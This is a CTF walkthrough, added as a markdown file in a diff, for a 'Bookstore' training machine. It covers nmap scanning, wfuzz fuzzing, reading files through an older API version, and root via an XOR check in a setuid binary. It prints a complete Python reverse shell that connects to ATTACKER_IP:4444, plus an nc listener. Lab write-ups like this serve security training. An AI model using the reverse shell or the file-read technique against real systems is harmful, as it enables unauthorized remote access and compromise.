@@ -1,0 +1,143 @@
+📘 Bookstore Machine Writeup
+🧠 Overview
+
+This machine focuses on:
+
+API enumeration & fuzzing
+Exploiting Werkzeug console exposure
+Gaining reverse shell access
+Binary analysis for privilege escalation
+🎯 Target Information
+IP Address: 10.48.172.248
+🔍 Reconnaissance
+Nmap Scan
+nmap -sC -sV -oN nmap.txt 10.48.172.248
+Results
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu
+80/tcp   open  http    Apache 2.4.29 (Ubuntu)
+5000/tcp open  http    Werkzeug 0.14.1 (Python 3.6.9)
+Key Observations
+Port 80 hosts a "Book Store" web app
+Port 5000 runs a Werkzeug-based API service
+/robots.txt reveals /api
+🌐 Web Enumeration
+Initial Access
+
+Accessing:
+
+http://<target>:5000
+
+Reveals an API service.
+
+API Documentation
+
+Navigating to /api/ gives:
+
+/api/v2/resources/books/all
+/api/v2/resources/books/random4
+/api/v2/resources/books?id=1
+/api/v2/resources/books?author=J.K. Rowling
+/api/v2/resources/books?published=1993
+🔎 Fuzzing for Hidden Parameters
+
+Using wfuzz:
+
+wfuzz -u http://bookstore.thm:5000/api/v1/resources/books?FUZZ=.bash_history \
+-w /usr/share/seclists/Discovery/Web-Content/big.txt --hc 404
+Results
+author
+id
+published
+show
+🚪 Exploiting API Versioning
+
+Switching from:
+
+/api/v2/
+
+to:
+
+/api/v1/
+
+Then accessing:
+
+http://bookstore.thm:5000/api/v1/resources/books?show=.bash_history
+
+👉 This exposes the Werkzeug debug console (PIN protected)
+
+🔓 Gaining RCE via Werkzeug Console
+
+After obtaining access to the console, execute a reverse shell:
+
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("ATTACKER_IP",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+subprocess.call(["/bin/sh","-i"])
+Listener
+nc -lvnp 4444
+Result
+Connection received
+/bin/sh: can't access tty
+
+✔ Shell obtained
+
+👤 User Access
+
+Navigate to:
+
+cd /home
+
+Retrieve:
+
+user.txt
+🔺 Privilege Escalation
+Step 1: Identify Binary
+
+A binary named:
+
+try-harder
+Step 2: Analyze with Ghidra
+
+Key variables identified:
+
+local_1c = 4374
+local_18 = 23987
+target   = 1573724660
+
+Logic:
+
+local_14 = local_1c ^ input ^ local_18
+Step 3: Solve for Input
+
+We solve:
+
+input = target ^ local_1c ^ local_18
+
+Calculation:
+
+1573724660 ^ 4374 ^ 23987
+= 1573743953
+Step 4: Exploit
+./try-harder
+
+Enter:
+
+1573743953
+Result
+root@bookstore:~#
+
+✔ Root access achieved
+
+🏁 Root Flag
+
+Retrieve:
+
+cat /root/root.txt
+💡 Key Takeaways
+API versioning flaws can expose hidden functionality
+Werkzeug debug console = critical RCE vector
+Fuzzing parameters is essential in API testing
+Binary exploitation using XOR logic is common in CTFs
